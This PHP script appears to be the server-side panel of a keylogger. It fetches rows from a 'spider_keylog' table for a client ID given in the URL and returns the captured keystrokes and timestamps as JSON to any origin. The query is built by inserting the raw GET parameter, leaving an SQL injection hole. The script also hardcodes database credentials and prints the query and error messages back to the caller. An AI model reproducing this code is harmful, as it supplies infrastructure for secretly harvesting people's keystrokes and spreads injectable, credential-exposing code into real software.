<?php
	header('Content-Type: application/json');
	header('Access-Control-Allow-Origin: *');

	if (isset($_GET['client'])) {
	$db = mysql_connect('mysql1.alwaysdata.com', '106149_nibbler', 'password');
	mysql_select_db('epitech-hub_nibbler', $db);
	$sql = 'SELECT * FROM spider_keylog WHERE client_id = "'.$_GET['client'].'" ORDER BY date DESC';
	$req = mysql_query($sql) or die('SQL Error :<br>'.$sql.'<br>'.mysql_error());
	$i = 0;
	$mainTab = array();
	while($data = mysql_fetch_assoc($req)) {
		$local = "";
		$local['key'] = $data['data'];
		$local['date'] = date('d/m/Y', $data['date']).' - '.date('H:i:s', $data['date']);
		array_push($mainTab, $local);
	}
	$final['list'] = $mainTab;
	$final['status'] = true;
} else {
	$final['status'] = false;
}
echo json_encode($final);
mysql_close();
?>